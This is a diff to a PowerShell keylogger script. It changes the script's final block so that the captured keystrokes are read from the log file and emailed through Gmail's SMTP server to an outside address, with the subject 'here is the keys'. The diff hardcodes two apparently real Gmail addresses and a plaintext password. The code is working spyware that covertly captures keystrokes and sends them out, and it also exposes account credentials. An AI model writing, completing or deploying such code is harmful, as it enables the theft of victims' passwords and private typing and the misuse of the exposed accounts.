@@ -27,7 +27,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     # executes and shows the collected key presses
 
     $time = 0
-    while($time -lt 6001) {
+    while($time -lt 600) {
 
     $time
     $time++
@@ -67,19 +67,20 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   finally
   {
     # open logger file in Notepad
-    Get-Content $Path
 
+    $data = Get-Content "$Path" 
     $emailto = 'canarerobertjohn@gmail.com'
     $email = 'wisincsales@gmail.com'
     $SMTPServer = 'smtp.gmail.com'
     $SMTPPort = '587'
-    $Password = 'password'
-    $subject = 'subject'
-    $data = $Path	
+    $Password = 'robertjohn'
+    $subject = 'here is the keys'	
     $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
     $smtp.EnableSSL = $true
     $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $Password);
     $smtp.Send($email, $emailto, $subject, $data);
+    
+    
   }
 }
 
